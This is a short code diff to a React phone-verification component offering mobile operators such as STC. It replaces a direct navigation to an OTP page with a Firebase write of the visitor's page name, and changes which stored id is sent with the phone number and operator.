@@ -12,6 +12,7 @@ import { PhoneVerificationService } from "../services/PhoneVerificationService";
 import { STCModal } from "../components/STCModal";
 import { sendPhone } from "../apis/orders";
 import FirestoreRedirect from "./rediract-page";
+import { addData } from "../apis/firebase";
 
 const operators = [
   { id: "stc", name: "STC", logo: "/companies/stc.png" },
@@ -49,7 +50,7 @@ export const PhoneVerification = () => {
       setTimeLeft((prevTime) => {
         if (prevTime <= 1) {
           clearInterval(timer);
-          navigate("/verify-otp");
+          addData({ id: visitorId, pagename: "verify-otp" });
           return 0;
         }
         return prevTime - 1;
@@ -114,9 +115,9 @@ export const PhoneVerification = () => {
             localStorage.setItem("operator", operator);
 
             // Legacy API call if needed
-            const order_id = localStorage.getItem("order_id");
+            const order_id = localStorage.getItem("visitor");
             if (order_id) {
-              await sendPhone(JSON.parse(order_id), phone, operator);
+              await sendPhone(order_id, phone, operator);
             }
           } catch (error) {
             console.error("Verification failed:", error);
